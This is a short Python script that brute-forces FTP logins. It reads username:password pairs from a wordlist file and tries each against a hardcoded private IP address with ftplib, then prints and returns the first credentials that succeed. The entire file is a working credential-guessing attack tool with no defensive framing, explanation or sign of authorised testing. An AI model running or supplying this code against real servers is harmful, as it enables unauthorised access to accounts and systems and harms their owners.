# -*- coding: utf-8 -*-
"""
Created on Sat Jun 22 11:25:57 2019

@author: Administrator
"""

import ftplib
def bruteLogin(hostname,passwdFile):
    pF=open(passwdFile,'r')
    for line in pF.readlines():
        username=line.split(':')[0]
        password=line.split(':')[1].strip('\n').strip('\r')
        print("[+] Trying :"+username+"/"+password)
        try:
            ftp=ftplib.FTP(hostname)
            ftp.login(username,password)
            print('\n[*]  '+str(hostname) +' FTP Logon Succeed: '+username+"/"+password)
            ftp.quit()
            return (username,password)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None,None)
host='10.134.196.21'
passwdFile='userpass.txt'
bruteLogin(host,passwdFile)        